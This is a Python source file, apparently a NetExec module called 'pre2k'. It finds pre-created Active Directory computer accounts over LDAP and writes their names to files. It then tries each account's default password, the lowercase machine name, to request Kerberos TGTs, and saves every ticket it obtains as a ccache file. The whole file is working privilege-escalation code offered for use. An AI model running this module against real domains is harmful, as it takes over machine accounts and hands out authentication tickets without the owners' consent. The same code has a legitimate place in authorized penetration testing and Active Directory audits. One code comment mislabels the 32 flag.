import os
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import NXC_PATH


class NXCModule:
    """
    Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each pre-created computer account.
    Module by: @shad0wcntr0ller
    """
    name = "pre2k"
    description = "Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def options(self, context, module_options):
        """
        ALL     Attempt to authenticate for every computer object in the domain (default: False)

        Examples:
        nxc ldap $IP -u $USER -p $PASSWORD -M pre2k
        nxc ldap $IP -u $USER -p $PASSWORD -M pre2k -o ALL=True
        """
        self.all_option = module_options.get("ALL", "").lower() in ["true", "1", "yes"]

    def on_login(self, context, connection):
        # Define the search filter
        if self.all_option:
            search_filter = "(&(objectClass=computer))"
        else:
            search_filter = "(&(objectClass=computer)(userAccountControl=4128))"  # 4128 = 4096 (WORKSTATION_TRUST_ACCOUNT) | 32 (WORKSTATION_TRUST_ACCOUNT)

        attributes = ["sAMAccountName", "userAccountControl", "dNSHostName"]

        context.log.info(f"Using search filter: {search_filter}")
        context.log.info(f"Attributes to retrieve: {attributes}")

        computers = {}

        try:
            # Use paged search to retrieve all computer accounts with specific flags
            search_results = connection.search(search_filter, attributes)
            results = parse_result_attributes(search_results)
            context.log.debug(f"Search results: {results}")

            for computer in results:
                context.log.debug(f"Processing computer: {computer['sAMAccountName']}, UAC: {computer['userAccountControl']}")
                computers[computer["sAMAccountName"]] = computer["userAccountControl"]
                context.log.debug(f"Added computer: {computer['sAMAccountName']}")

            # Save computers to file
            domain_dir = os.path.join(f"{NXC_PATH}/modules/pre2k", connection.domain)
            output_file_pre2k = os.path.join(domain_dir, "precreated_computers.txt")
            output_file_non_pre2k = os.path.join(domain_dir, "non_precreated_computers.txt")

            # Create directories if they do not exist
            os.makedirs(domain_dir, exist_ok=True)

            with open(output_file_pre2k, "w") as pre2k_file, open(output_file_non_pre2k, "w") as non_pre2k_file:
                for computer, uac in computers.items():
                    if int(uac) == 4128:
                        pre2k_file.write(f"{computer}\n")
                    else:
                        non_pre2k_file.write(f"{computer}\n")

            # Print discovered (pre-created) computer accounts
            if computers:
                for computer, uac in computers.items():
                    if int(uac) == 4128:
                        context.log.highlight(f"Pre-created computer account: {computer}")
                    else:
                        context.log.debug(f"Computer account: {computer}")

                counter_pre2k = len([v for v in computers.values() if int(v) == 4128])
                counter_non_pre2k = len([v for v in computers.values() if int(v) != 4128])

                if counter_pre2k != 0:
                    context.log.success(f"Found {counter_pre2k} pre-created computer accounts. Saved to {output_file_pre2k}")
                if counter_non_pre2k != 0:
                    context.log.success(f"Found {counter_non_pre2k} normal computer accounts. Saved to {output_file_non_pre2k}")
            else:
                context.log.info("No pre-created computer accounts found.")

            # Obtain TGTs and save to ccache
            ccache_base_dir = f"{NXC_PATH}/modules/pre2k/ccache"
            os.makedirs(ccache_base_dir, exist_ok=True)

            successful_tgts = 0

            for computer in computers:
                machine_name = computer[:-1].lower()  # Remove trailing '$' and convert to lowercase
                if self.get_tgt(context, machine_name, connection.domain, connection.kdcHost, ccache_base_dir):
                    successful_tgts += 1

            # Summary of TGT results
            if successful_tgts > 0:
                context.log.success(f"Successfully obtained TGT for {successful_tgts} (pre-created) computer accounts. Saved to {ccache_base_dir}")
        except Exception as e:
            context.log.fail(f"Error occurred during search: {e}")

    def get_tgt(self, context, username, domain, kdcHost, ccache_base_dir):
        try:
            userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            password = username[:14]  # Password is the first 14 characters of the machine name in lowercase
            context.log.info(f"Getting TGT for {username}@{domain}")

            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                clientName=userName,
                password=password,
                domain=domain,
                lmhash="",
                nthash="",
                aesKey="",
                kdcHost=kdcHost,
                serverName=None
            )

            self.save_ticket(context, username, tgt, oldSessionKey, ccache_base_dir)
            context.log.success(f"Successfully obtained TGT for {username}@{domain}")
            return True
        except Exception as e:
            if "KDC_ERR_PREAUTH_FAILED" in str(e):
                if self.all_option:
                    context.log.debug(f"Failed to get TGT for {username}@{domain}: KDC_ERR_PREAUTH_FAILED")
                else:
                    context.log.fail(f"Failed to get TGT for {username}@{domain}: KDC_ERR_PREAUTH_FAILED")
            else:
                context.log.fail(f"Error obtaining TGT for {username}@{domain}: {e}")
            return False

    def save_ticket(self, context, username, ticket, sessionKey, ccache_base_dir):
        try:
            ccache = CCache()
            ccache.fromTGT(ticket, sessionKey, sessionKey)
            ccache_filename = os.path.join(ccache_base_dir, f"{username}.ccache")
            ccache.saveFile(ccache_filename)
            context.log.info(f"Saved ticket in {ccache_filename}")
        except Exception as e:
            context.log.fail(f"Failed to save ticket for {username}: {e}")
